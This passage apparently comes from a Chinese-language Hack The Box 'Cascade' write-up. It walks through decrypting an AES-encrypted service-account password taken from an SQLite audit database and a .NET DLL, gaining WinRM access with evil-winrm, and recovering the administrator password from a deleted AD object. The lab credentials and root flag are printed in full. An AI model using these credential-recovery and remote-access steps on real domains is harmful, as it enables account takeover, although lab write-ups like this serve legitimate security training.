+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\R</span>unAudit.bat of size <span style="color:#ae81ff">45</span> as RunAudit.bat <span style="color:#f92672">(</span>0.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 15.8 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\S</span>ystem.Data.SQLite.dll of size <span style="color:#ae81ff">363520</span> as System.Data.SQLite.dll <span style="color:#f92672">(</span>265.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 129.8 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\S</span>ystem.Data.SQLite.EF6.dll of size <span style="color:#ae81ff">186880</span> as System.Data.SQLite.EF6.dll <span style="color:#f92672">(</span>86.5 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 111.7 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\D</span>B<span style="color:#ae81ff">\A</span>udit.db of size <span style="color:#ae81ff">24576</span> as DB/Audit.db <span style="color:#f92672">(</span>47.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 105.7 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\x</span>64<span style="color:#ae81ff">\S</span>QLite.Interop.dll of size <span style="color:#ae81ff">1639936</span> as x64/SQLite.Interop.dll <span style="color:#f92672">(</span>398.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 228.6 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>getting file <span style="color:#ae81ff">\x</span>86<span style="color:#ae81ff">\S</span>QLite.Interop.dll of size <span style="color:#ae81ff">1246720</span> as x86/SQLite.Interop.dll <span style="color:#f92672">(</span>386.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 267.6 KiloBytes/sec<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/Audit<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls -liah
+</span></span><span style="display:flex;"><span>total 592K
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2799032</span> drwxrwxr-x <span style="color:#ae81ff">5</span> kali kali 4.0K Aug <span style="color:#ae81ff">19</span> 03:43 .
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2792051</span> drwxrwxr-x <span style="color:#ae81ff">6</span> kali kali 4.0K Aug <span style="color:#ae81ff">19</span> 03:43 ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2799033</span> -rw-r--r-- <span style="color:#ae81ff">1</span> kali kali  13K Aug <span style="color:#ae81ff">19</span> 03:43 CascAudit.exe
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2799034</span> -rw-r--r-- <span style="color:#ae81ff">1</span> kali kali  12K Aug <span style="color:#ae81ff">19</span> 03:43 CascCrypto.dll
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2799035</span> drwxrwxr-x <span style="color:#ae81ff">2</span> kali kali 4.0K Aug <span style="color:#ae81ff">19</span> 03:43 DB
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2799036</span> -rw-r--r-- <span style="color:#ae81ff">1</span> kali kali   <span style="color:#ae81ff">45</span> Aug <span style="color:#ae81ff">19</span> 03:43 RunAudit.bat
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2799037</span> -rw-r--r-- <span style="color:#ae81ff">1</span> kali kali 355K Aug <span style="color:#ae81ff">19</span> 03:43 System.Data.SQLite.dll
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2799048</span> -rw-r--r-- <span style="color:#ae81ff">1</span> kali kali 183K Aug <span style="color:#ae81ff">19</span> 03:43 System.Data.SQLite.EF6.dll
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2799072</span> drwxrwxr-x <span style="color:#ae81ff">2</span> kali kali 4.0K Aug <span style="color:#ae81ff">19</span> 03:43 x64
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2799081</span> drwxrwxr-x <span style="color:#ae81ff">2</span> kali kali 4.0K Aug <span style="color:#ae81ff">19</span> 03:43 x86
+</span></span></code></pre></div><p>连接数据库，查询到一个凭据。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/Audit<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sqlite3 DB/Audit.db 
+</span></span><span style="display:flex;"><span>SQLite version 3.46.1 2024-08-13 09:16:08
+</span></span><span style="display:flex;"><span>Enter <span style="color:#e6db74">&#34;.help&#34;</span> <span style="color:#66d9ef">for</span> usage hints.
+</span></span><span style="display:flex;"><span>sqlite&gt; .tables
+</span></span><span style="display:flex;"><span>DeletedUserAudit  Ldap              Misc            
+</span></span><span style="display:flex;"><span>sqlite&gt; .schema
+</span></span><span style="display:flex;"><span>CREATE TABLE IF NOT EXISTS <span style="color:#e6db74">&#34;Ldap&#34;</span> <span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Id&#34;</span>    INTEGER PRIMARY KEY AUTOINCREMENT,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;uname&#34;</span> TEXT,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;pwd&#34;</span>   TEXT,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;domain&#34;</span>        TEXT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>CREATE TABLE sqlite_sequence<span style="color:#f92672">(</span>name,seq<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>CREATE TABLE IF NOT EXISTS <span style="color:#e6db74">&#34;Misc&#34;</span> <span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Id&#34;</span>    INTEGER PRIMARY KEY AUTOINCREMENT,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Ext1&#34;</span>  TEXT,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Ext2&#34;</span>  TEXT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>CREATE TABLE IF NOT EXISTS <span style="color:#e6db74">&#34;DeletedUserAudit&#34;</span> <span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Id&#34;</span>    INTEGER PRIMARY KEY AUTOINCREMENT,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Username&#34;</span>      TEXT,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Name&#34;</span>  TEXT,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;DistinguishedName&#34;</span>     TEXT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>sqlite&gt; .headers on
+</span></span><span style="display:flex;"><span>sqlite&gt; .mode colum
+</span></span><span style="display:flex;"><span>sqlite&gt; SELECT * FROM ldap;
+</span></span><span style="display:flex;"><span>Id  uname   pwd                       domain       
+</span></span><span style="display:flex;"><span>--  ------  ------------------------  -------------
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   ArkSvc  BQO5l5Kj9MdErXx6Q6AGOw<span style="color:#f92672">==</span>  cascade.local
+</span></span></code></pre></div><p>找到 IV。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ strings -el Audit/CascCrypto.dll
+</span></span><span style="display:flex;"><span>1tdyjCbY1Ix49842
+</span></span><span style="display:flex;"><span>CascCrypto.Resources
+</span></span><span style="display:flex;"><span>1tdyjCbY1Ix49842
+</span></span><span style="display:flex;"><span>VS_VERSION_INFO
+</span></span><span style="display:flex;"><span>VarFileInfo
+</span></span><span style="display:flex;"><span>Translation
+</span></span><span style="display:flex;"><span>StringFileInfo
+</span></span><span style="display:flex;"><span>000004b0
+</span></span><span style="display:flex;"><span>FileDescription
+</span></span><span style="display:flex;"><span>AesCrypto
+</span></span><span style="display:flex;"><span>FileVersion
+</span></span><span style="display:flex;"><span>1.0.0.0
+</span></span><span style="display:flex;"><span>InternalName
+</span></span><span style="display:flex;"><span>CascCrypto.dll
+</span></span><span style="display:flex;"><span>LegalCopyright
+</span></span><span style="display:flex;"><span>Copyright 
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">2020</span>
+</span></span><span style="display:flex;"><span>OriginalFilename
+</span></span><span style="display:flex;"><span>CascCrypto.dll
+</span></span><span style="display:flex;"><span>ProductName
+</span></span><span style="display:flex;"><span>AesCrypto
+</span></span><span style="display:flex;"><span>ProductVersion
+</span></span><span style="display:flex;"><span>1.0.0.0
+</span></span><span style="display:flex;"><span>Assembly Version
+</span></span><span style="display:flex;"><span>1.0.0.0
+</span></span></code></pre></div><p>用 dnSpy 找到 KEY。</p>
+<p><img src="Pasted%20image%2020260819162802.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ KEY<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#39;c4scadek3y654321&#39;</span> | xxd -p -c 256<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>                                                                                                                                                                        
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ IV<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>printf <span style="color:#e6db74">&#39;1tdyjCbY1Ix49842&#39;</span> | xxd -p -c 256<span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><p>解密。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;BQO5l5Kj9MdErXx6Q6AGOw==&#34;</span> | base64 -d | openssl enc -d -aes-128-cbc -K <span style="color:#e6db74">&#34;</span>$KEY<span style="color:#e6db74">&#34;</span> -iv <span style="color:#e6db74">&#34;</span>$IV<span style="color:#e6db74">&#34;</span>                                                       w3lc0meFr31nd 
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;ArkSvc:w3lc0meFr31nd&#34;</span> &gt;&gt; Users/ArkSvc
+</span></span></code></pre></div><p>新账户有 winrm 权限。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc winrm cascade.local -u ArkSvc -p <span style="color:#e6db74">&#39;w3lc0meFr31nd&#39;</span>           
+</span></span><span style="display:flex;"><span>WINRM       10.129.26.199   <span style="color:#ae81ff">5985</span>   CASC-DC1         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">7</span> / Server <span style="color:#ae81ff">2008</span> R2 Build <span style="color:#ae81ff">7601</span> <span style="color:#f92672">(</span>name:CASC-DC1<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:cascade.local<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
+</span></span><span style="display:flex;"><span>  arc4 <span style="color:#f92672">=</span> algorithms.ARC4<span style="color:#f92672">(</span>self._key<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>WINRM       10.129.26.199   <span style="color:#ae81ff">5985</span>   CASC-DC1         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> cascade.local<span style="color:#ae81ff">\A</span>rkSvc:w3lc0meFr31nd <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>登录。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i cascade.local -u ArkSvc -p <span style="color:#e6db74">&#39;w3lc0meFr31nd&#39;</span>                   
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>rksvc<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
+</span></span><span style="display:flex;"><span>cascade<span style="color:#ae81ff">\a</span>rksvc
+</span></span></code></pre></div><p>发现有回收站权限。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>rksvc<span style="color:#ae81ff">\D</span>ocuments&gt; net user arksvc
+</span></span><span style="display:flex;"><span>User name                    arksvc
+</span></span><span style="display:flex;"><span>Full Name                    ArkSvc
+</span></span><span style="display:flex;"><span>Comment
+</span></span><span style="display:flex;"><span>User<span style="color:#960050;background-color:#1e0010">&#39;</span>s comment
+</span></span><span style="display:flex;"><span>Country code                 <span style="color:#ae81ff">000</span> <span style="color:#f92672">(</span>System Default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Account active               Yes
+</span></span><span style="display:flex;"><span>Account expires              Never
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Password last set            1/9/2020 5:18:20 PM
+</span></span><span style="display:flex;"><span>Password expires             Never
+</span></span><span style="display:flex;"><span>Password changeable          1/9/2020 5:18:20 PM
+</span></span><span style="display:flex;"><span>Password required            Yes
+</span></span><span style="display:flex;"><span>User may change password     No
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Workstations allowed         All
+</span></span><span style="display:flex;"><span>Logon script
+</span></span><span style="display:flex;"><span>User profile
+</span></span><span style="display:flex;"><span>Home directory
+</span></span><span style="display:flex;"><span>Last logon                   1/29/2020 10:05:40 PM
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Logon hours allowed          All
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Local Group Memberships      *AD Recycle Bin       *IT
+</span></span><span style="display:flex;"><span>                             *Remote Management Use
+</span></span><span style="display:flex;"><span>Global Group memberships     *Domain Users
+</span></span><span style="display:flex;"><span>The command completed successfully.
+</span></span></code></pre></div><p>查询到 admin 的 base64 密码。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>rksvc<span style="color:#ae81ff">\D</span>ocuments&gt; Import-Module ActiveDirectory
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\a</span>rksvc<span style="color:#ae81ff">\D</span>ocuments&gt; Get-ADObject -Filter <span style="color:#e6db74">&#39;isDeleted -eq $true -and name -like &#34;*TempAdmin*&#34;&#39;</span> -IncludeDeletedObjects -Properties cascadeLegacyPwd | Select-Object -ExpandProperty cascadeLegacyPwd
+</span></span><span style="display:flex;"><span>YmFDVDNyMWFOMDBkbGVz
+</span></span></code></pre></div><p>解密拿到 root flag。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade/Audit<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;YmFDVDNyMWFOMDBkbGVz&#34;</span> | base64 -d          
+</span></span><span style="display:flex;"><span>baCT3r1aN00dles
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali/Cascade<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ evil-winrm -i cascade.local -u administrator -p baCT3r1aN00dles 
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method <span style="color:#e6db74">`</span>quoting_detection_proc<span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">for</span> module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; type ..<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\r</span>oot.txt
+</span></span><span style="display:flex;"><span>26243664d997f28378144cd79119f1de
+</span></span></code></pre></div>
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="http://localhost:1313/tags/hack/">Hack</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/htb/">HTB</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/writeup/">Writeup</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/ldap/">LDAP</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/smb/">SMB</a></span>
+        <span class="tag"><a href="http://localhost:1313/tags/%E9%80%86%E5%90%91/">逆向</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        3298 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2026-08-19 14:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+
+            
+            <span class="button next">
+                <a href="http://localhost:1313/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8-skill---enil-ling-pesing/">
+                    <span class="button__text">网络安全 Skill---Enil-ling-pesing</span>
+                    <span class="button__icon">→</span>
+                </a>
+            </span>
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.ad54ad97364f77ede35def9096b162bb1f0b3973aa50b080f5e82fa147f6882e2a7200d7535adbf9b51bebf939f1c1ca9bbe6be87530092aca720eac4a226fda.js" integrity="sha512-rVStlzZPd&#43;3jXe&#43;QlrFiux8LOXOqULCA9egvoUf2iC4qcgDXU1rb&#43;bUb6/k58cHKm75r6HUwCSrKcg6sSiJv2g=="></script>
+
+
+
+
+    </body>
+</html>
